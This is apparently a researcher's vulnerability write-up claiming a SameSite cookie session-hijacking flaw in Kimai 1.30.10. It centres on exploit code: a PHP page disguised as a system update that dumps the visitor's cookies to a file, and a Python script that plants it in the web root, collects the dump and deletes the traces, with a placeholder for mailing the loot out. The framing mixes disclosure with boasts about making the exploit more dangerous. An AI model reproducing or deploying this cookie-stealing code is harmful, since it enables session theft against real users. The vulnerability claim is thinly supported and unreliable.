## [Kimai-1.30.10 - PWN-Update-SameSite-Cookie-Vulnerability-session-hijacking](https://github.com/kimai/kimai)

![](https://github.com/nu11secur1ty/CVE-nu11secur1ty/blob/main/vendors/kimai/2023/Kimai-1.30.10/docs/Screenshot%202023-02-23%20175306.png)

## Description:
The Kimai-1.30.10 is vulnerable to SameSite-Cookie-Vulnerability-session-hijacking.
The attacker can trick the victim to update or upgrade the system, by using a very malicious exploit to steal his vulnerable cookie and get control of his session.

STATUS: HIGH Vulnerability

[+]Exploit:
## WARNING: The EXPLOIT IS FOR ADVANCED USERS!
## NOTE: This can be built in one script more dangerous than ever... ;)
This is only one example:
```python
#!/usr/bin/python
import os
import webbrowser
import time

webbrowser.open('https://pwnedhost.com/kimai-1.30.10/public/en/login')
input("After you log in please press any key to continue...")
os.system("copy Update.php C:\\xampp\\htdocs\\pwnedhost\\kimai-1.30.10\\public\\")
time.sleep(3)
webbrowser.open('https://pwnedhost.com/kimai-1.30.10/public/Update.php')
time.sleep(3)
os.system("copy C:\\xampp\\htdocs\\pwnedhost\\kimai-1.30.10\\public\\PoC.txt C:\\Users\\venvaropt\\Desktop\\Kimai-1.30.10\\PoC\\")
# Your mail-sending code must be here ;)
time.sleep(7)
os.system("del C:\\xampp\\htdocs\\pwnedhost\\kimai-1.30.10\\public\\PoC.txt")
os.system("del C:\\xampp\\htdocs\\pwnedhost\\kimai-1.30.10\\public\\Update.php")

```
-----------------------------------------
```PHP
<?php
//echo '<pre>';
//	print_r( $_COOKIE );
//die();

	$fp = fopen('PoC.txt', 'w');
	fwrite($fp, print_r($_COOKIE, TRUE));
	fclose($fp);
	echo "DONE: Now you are already updated! Enjoy your system Kimai 1.30.10 stable (Ayumi)";
?>
```

## Reproduce:
[href](https://github.com/nu11secur1ty/CVE-nu11secur1ty/tree/main/vendors/kimai/2023/Kimai-1.30.10)

## Proof and Exploit:
[href](https://streamable.com/md9fmr)


## NOTE: 
The `real` exploit will never be uploaded if someone wants to receive the code-the exploit, please contact me.

## NOTE: 
There have a lot of methods for stealing cookies. 
The question is, why this one cookie is not sanitizing well, and with this cookie, a couple of users can use the same session?üòÅ BR

## Time spend:
03:00:00
